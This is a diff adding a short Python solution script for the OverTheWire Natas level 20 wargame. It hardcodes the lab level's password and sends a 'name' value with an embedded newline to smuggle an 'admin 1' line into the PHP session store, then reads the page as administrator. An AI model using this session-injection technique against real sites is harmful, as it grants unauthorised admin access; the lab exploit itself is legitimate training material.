@@ -1,0 +1,10 @@
+#!/usr/bin/env python
+
+import requests
+
+url = "http://natas20.natas.labs.overthewire.org/"
+auth = ("natas20", "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF")
+
+requests.get(url, auth=auth, cookies={"PHPSESSID": "foobar"},  params=[("name", "admin\nadmin 1")])
+response = requests.get(url, auth=auth, cookies={"PHPSESSID": "foobar"})
+print(response.text)
